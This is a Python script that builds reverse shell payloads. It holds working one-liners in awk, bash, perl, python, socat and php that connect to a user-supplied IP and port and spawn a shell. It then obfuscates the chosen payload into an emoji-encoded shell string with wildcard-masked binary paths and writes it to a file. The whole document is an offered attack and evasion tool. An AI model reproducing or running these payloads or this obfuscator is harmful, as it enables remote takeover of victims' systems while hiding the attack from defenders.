#!/usr/bin/env python
import os.path
import random
import string
import sys
if len(sys.argv) < 3 and not len(sys.argv) > 5 and len(sys.argv) < 5: # if the total number of arguments is less than 3 and not greater than and less than 5, print script usage and exit.
    print("Usage: "+sys.argv[0]+" {IP address} {Port} {Output Filename} {Payload Type}")
    print("-- --> "+sys.argv[0]+" {Payload File} {Output Filename}")
    print("Payloads available: awk, bash, perl, python, socat, php") # Add more if you'd like and display them here.
    exit(1)

payload="" # Payload holds the user supplied filename.
skel="" # Skel holds the payload code from a user supplied script (oneliners preferably) or supported within the payloadType dictionary.
if os.path.isfile(sys.argv[1]):
    with open(sys.argv[1], 'r') as content_file:
        skel = content_file.read()
        content_file.close()
        payload=sys.argv[2]
else:
    ip=sys.argv[1] # IP Address.
    port=sys.argv[2] # Port.
    payload=sys.argv[3] # Output filename to be anything user supplied.
    pltype=sys.argv[4] # Payload type
    #awk, bash, perl, python, socat, php, all oneliners can be found on the swisskeyrepo @ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md                                                         :skull:
    payloadType={'awk': 'awk \'BEGIN {s = "/inet/tcp/0/'+ip+'/'+port+'"; while(42) { do{ printf "[\xf0\x9f\x92\x80]> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null', 'bash':'bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1', 'perl':'perl -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', 'python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'', 'socat':'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:'+ip+':'+port+'', 'php':'php -r \'$sock=fsockopen("'+ip+'",'+port+');$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''}
    if payloadType[pltype]: # Check if Pltype is supported
        skel = payloadType[pltype]
    else:
        print("Error! The Payload Type supplied is not currently supported.")
        print("Payload types available: awk, bash, perl, python, socat, php")
        print("Consider providing your own payload if your preference is not listed.")
        exit(1)

print("Applying secret emoji sauce...") # The following dictionary is a collection of forty-eight selectively chosen emojis represented in hexadecimal format. Feel free to add more or change as one sees fit.

emojiDict = [ "\xf0\x9f\x92\x80","\xe2\x98\xa0","\xf0\x9f\x91\xbd","\xf0\x9f\x91\xbe","\xf0\x9f\x98\xb1","\xf0\x9f\x91\xbb","\xf0\x9f\x92\x94","\xf0\x9f\x95\xb7","\xf0\x9f\x95\xb8","\xf0\x9f\xa6\xa0","\xf0\x9f\x8d\x84","\xf0\x9f\x90\xb8","\xf0\x9f\x92\xa3","\xf0\x9f\x92\xab","\xf0\x9f\x92\xa2","\xf0\x9f\x96\xa4","\xf0\x9f\x94\xa5","\xe2\x98\x84","\xf0\x9f\x8c\x99","\xf0\x9f\xa7\xa8","\xf0\x9f\x8e\x88","\xf0\x9f\x8e\x89","\xf0\x9f\x8e\x8a","\xf0\x9f\x8e\xb5","\xf0\x9f\x8e\xb6","\xf0\x9f\x93\xb1","\xf0\x9f\x92\xbb","\xf0\x9f\x96\xab","\xf0\x9f\x96\xaa","\xf0\x9f\x92\xbf","\xf0\x9f\x93\xba","\xf0\x9f\x92\xb0","\xf0\x9f\x94\x92","\xf0\x9f\x94\x93","\xf0\x9f\x94\x91","\xf0\x9f\xa7\xaa","\xf0\x9f\xa7\xab","\xf0\x9f\x93\xa1","\xe2\x98\xa2","\xe2\x98\xa3","\xe2\x98\xae","\xe2\x9a\x9b","\xe2\x99\xbb","\xe3\x8a\x99","\xf0\x9f\xa4\x91","\xf0\x9f\x98\xb5","\xf0\x9f\xa5\xb3","\xf0\x9f\xa7\x90" ]
rinse=random.randint(1,len(emojiDict)-1) # Randomized index value to pull from emojiDict.
rant=random.randint(1,len(emojiDict)-1)
run=random.randint(1,len(emojiDict)-1) #
skull=[] # Skull will be used as a container to catch the results of the skel set.
skeleten=[] # Skeleten will hold the final payload generated.
bones=[] # Bones is a dictionary set used for the emoji-encoding process.

for i in skel: # Iterate over characters in Skel and encode in octal while appending result to Skull.
    skull.append(oct(ord(i))[1:])

prntf = emojiDict[rinse] # Random emoji selected to represent as a wrapper function for the printf command.
prntln = emojiDict[rant] # Random emoji selected for the Print Line Count function. 
shll = emojiDict[run] # Random emoji selected to represent as a wrapper function for the sh command.
skeleten.append(prntf+"(){ /??r/??n/?r?nt? ${@};};") # Append payload skeleten code with randomly selected emojis representing the functions within the template.
skeleten.append(prntln+"(){ "+prntf+" ${#};};")
skeleten.append(shll+"""(){ /??n/b?sh -c "${@}";};""") # 
mvar=random.choice(string.ascii_letters) # Set variable to random value from a-zA-Z ascii string.
skeleten.append(mvar+"=$("+prntf+' "') # Append variable along with the printf function emoji to skeleten template. 
# Magic sauce
for ndx in skull: # Loop through Skull results
    bones.append("\\\\") # Append '\\' to Bones.
    for num in ndx: # Loop-di-loop
        bones.append("`") # Append '`' to Bones.
        bones.append(prntln) # Append emoji representing the Print Line Count function.
        em=emojiDict[random.randint(1,len(emojiDict)-1)]+" " # Randomly set emoji as the count symbol.
        mji = em*int(num) # Count with me.
        if len(mji) > 0: # Check if length of the count is greater than 0. If so, append the count emoji to Bones seperated by spaces.
            bones.append(" ")
            bones.append(mji[:-1])
            bones.append("`")
        else: # Otherwise, close the Print Line Count function as to represent a '0' in the final payload.
            bones.append("`")

skeleten.append(''.join(bones)) # Append the result stored in Bones to the Skeleten dictionary.
skeleten.append('");')
skeleten.append(shll+' "${'+mvar+'}";')
print("Successful payload generation!") # Placed as an indicater the payload is set to be generated. Feel free to comment out the line below to quiet the verbosity of the script.
print(''.join(skeleten)) # <--- Move me to the begining to turn off.
with open(payload, "w") as outfile: # Write payload to the specified filename.
    outfile.writelines(''.join(skeleten))
    outfile.close()

print("Payload successfully written to: "+payload) # EOF